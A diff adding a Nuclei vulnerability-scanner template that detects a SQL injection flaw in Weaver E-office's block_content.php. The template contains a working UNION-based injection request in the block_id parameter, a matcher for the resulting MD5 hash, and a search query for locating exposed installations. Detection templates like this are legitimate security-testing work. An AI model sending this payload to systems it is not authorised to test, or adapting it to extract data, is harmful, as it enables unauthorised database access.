@@ -1,0 +1,25 @@
+id: e-office-block-content-sqli
+info:
+  name: E-office block_content.php - SQL Injiection
+  author: qwtd
+  severity: high
+  description: |
+    E-office block_content.php - SQL Injiection
+  reference:
+    - https://github.com/wooluo/nuclei-templates-2025hw/blob/2a9916e7dd3609737956777fcf4cfb399a40ac7c/weaver-Vulnerability.yaml
+  metadata:
+    hunter-query: app.name="泛微 e-office OA"
+    verified: true
+  tags: 泛微-EOffice
+  classification:
+    cwe-id: CWE-89
+http:
+  - raw:
+      - |
+        GET /general/new_mytable/block_content.php?block_id=1%20UNION%20ALL%20SELECT%20CONCAT(0x71787a6a71,IFNULL(CAST(md5(123456)%20AS%20NCHAR),0x20),0x7171627671)--%20- HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - e10adc3949ba59abbe56e057f20f883e
